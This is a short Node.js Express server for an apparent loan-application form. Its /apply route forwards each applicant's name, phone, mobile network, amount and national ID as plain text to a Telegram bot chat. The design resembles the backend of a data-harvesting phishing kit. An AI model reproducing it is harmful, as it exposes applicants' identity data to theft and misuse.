const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔐 ENV VARIABLES
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// 🔍 Debug (REMOVE LATER)
console.log("BOT_TOKEN:", BOT_TOKEN ? "Loaded" : "Missing");
console.log("CHAT_ID:", CHAT_ID ? "Loaded" : "Missing");

// Serve frontend
app.use(express.static(__dirname));

// Home route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// 🔥 TEST ROUTE (IMPORTANT)
app.get("/test", async (req, res) => {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: "✅ Test message from your app"
    });

    res.send("✅ Telegram working");
  } catch (error) {
    console.error("TEST ERROR:", error.response?.data || error.message);
    res.send("❌ Telegram failed");
  }
});

// Handle form submission
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).send("All fields are required");
  }

  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    // ✅ IMPORTANT: send status 200
    res.status(200).send("OK");

  } catch (error) {
    console.error("TELEGRAM ERROR:", error.response?.data || error.message);

    // ❌ send proper error
    res.status(500).send("FAILED");
  }
});

// Start server
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
